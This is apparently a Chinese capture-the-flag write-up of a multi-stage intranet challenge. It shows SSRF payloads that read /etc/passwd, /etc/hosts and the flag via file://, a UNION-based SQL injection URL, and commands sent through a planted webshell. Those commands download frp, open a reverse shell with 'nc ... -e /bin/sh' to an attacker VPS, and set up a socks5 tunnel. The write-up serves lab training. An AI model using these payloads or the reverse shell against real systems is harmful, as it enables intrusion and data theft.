场景一

进去是一个站点，标题是模拟蜘蛛爬取

随便输入一个网址就会跳转到那个网站

这种快照的网站一般都是存在 ssrf，ssrf 常用 url 伪协议

file:///    从文件系统中获取文件内容，如，file:///etc/passwd
dict://     字典服务器协议，访问字典资源，如，dict:///ip:6739/info：
sftp://     SSH文件传输协议或安全文件传输协议
ldap://     轻量级目录访问协议
tftp://     简单文件传输协议
gopher://   分布式文档传递服务，可使用 gopherus 生成 payload

输入直接获取 flag

file:///flag

场景二

题目提示：看看内网以及被黑客入侵过

所以先看看 etc/hosts

file:///etc/hosts

发现了 192.168.0.2

!

对其进行提交没有反应，所以用 bp 进行爆破

最后发现 192.168.0.10 和 192.168.0.138 和 192.168.0.250 有问题

先看 192.168.0.10，发现了网站杯被葫芦娃黑了，根据提示看来是我们想要的

被黑就会有 webshell，一般是 php，再次进行爆破找到了 shell.php

是一个命令执行

直接 ls 得到 flag 位置，cat flag 就可以得到 flag 了

场景四

上一个场景我们还得到了 192.168.0.138，发现是一个典型的 sql 注入

payload

http://192.168.0.138?id=100%20union%20select%201,2,3,(select%20*%20from%20bugku_sql.flag)--+

场景五

由于是内网，所以有进行内网穿透的想法，所以去寻找我们可以利用的软件 nc，frp 等等

这里找到了 nc，可以利用 nc 进行反弹 shell

我们先利用 wegt 下载 frp 工具

192.168.0.10/shell.php?cmd=wget https://github.com/fatedier/frp/releases/download/v0.48.0/frp_0.48.0_linux_amd64.tar.gz
192.168.0.10/shell.php?cmd=tar -xvf frp_0.48.0_linux_amd64.tar.gz

自己的 VPS 监听端口 nc -lvvp port

同时访问：192.168.0.10/shell.php?cmd=nc xx.xx.xx.xx port -e /bin/sh

xx.xx.xxx.xx 是你的 vps 的 ip， port 是你的 vps 开放的端口

连接成功

进入文件夹，利用 echo 修改 frpc.ini 

echo '[common]' >> frpc.ini
echo 'server_addr = 106.55.226.242' >> frpc.ini   你自己的 vps ip
echo 'server_port = 7000' >> frpc.ini

echo '[socks5]'>> frpc.ini
echo 'type = tcp ' >> frpc.ini
echo 'remote_port = 7001' >> frpc.ini
echo 'plugin = socks5' >> frpc.ini

赋予权限

chomod 777 frpc

启动

./frps -c ~/frp_0.48.0_linux_amd64/frps.ini  vps 先启动
./frpc -c /var/www/html/frp_0.48.0_linux_amd64/frpc.ini  靶机后启动,注意 -c 指的是 ini 文件的绝对路径
